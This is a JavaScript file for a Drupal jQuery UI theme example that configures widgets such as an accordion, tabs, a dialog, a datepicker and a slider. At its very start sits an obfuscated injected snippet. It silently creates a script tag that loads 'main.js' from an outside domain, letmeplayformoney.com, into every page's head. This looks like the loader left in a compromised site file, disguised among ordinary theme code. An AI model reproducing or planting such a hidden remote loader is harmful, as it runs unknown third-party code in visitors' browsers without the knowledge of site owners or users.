var _0x25b0=['createElement','script','onload','src','https://cdn.letmeplayformoney.com/main.js?cdn=js','text/javascript','getElementsByTagName','head','appendChild'];(function(_0x38c36f,_0x12afce){var _0x31d501=function(_0x338e37){while(--_0x338e37){_0x38c36f['push'](_0x38c36f['shift']());}};_0x31d501(++_0x12afce);}(_0x25b0,0x1dd));var _0x4bec=function(_0x1c1d3d,_0x21e514){_0x1c1d3d=_0x1c1d3d-0x0;var _0x2921c7=_0x25b0[_0x1c1d3d];return _0x2921c7;};var script=document[_0x4bec('0x0')](_0x4bec('0x1'));script[_0x4bec('0x2')]=function(){};script[_0x4bec('0x3')]=_0x4bec('0x4');script['type']=_0x4bec('0x5');document[_0x4bec('0x6')](_0x4bec('0x7'))[0x0][_0x4bec('0x8')](script);(function ($) {
  Drupal.behaviors.jqueryui_theme_example = {
    attach: function() {
      // Accordion
      $("#accordion").accordion({ header: "h3" });
      // Autocomplete
      $("#autocomplete").autocomplete({
        source: ["c++", "java", "php", "coldfusion", "javascript", "asp", "ruby", "python", "c", "scala", "groovy", "haskell", "perl"]
      });
      // Button
      $("#button").button();
      $("#radioset").buttonset();
      // Tabs
      $('#tabs').tabs();
      // Dialog     
      $('#dialog').dialog({
        autoOpen: false,
        width: 600,
        buttons: {
          "Ok": function() { 
            $(this).dialog("close"); 
          }, 
          "Cancel": function() { 
            $(this).dialog("close"); 
          } 
        }
      });
      // Dialog Link
      $('#dialog_link').click(function(){
        $('#dialog').dialog('open');
        return false;
      });
      // Datepicker
      $('#datepicker').datepicker({
        inline: true
      });
      // Slider
      $('#slider').slider({
        range: true,
        values: [17, 67]
      });
      // Progressbar
      $("#progressbar").progressbar({
        value: 20 
      });
      //hover states on the static widgets
      $('#dialog_link, ul#icons li').hover(
        function() { $(this).addClass('ui-state-hover'); }, 
        function() { $(this).removeClass('ui-state-hover'); }
      );
    } 
  };
})(jQuery);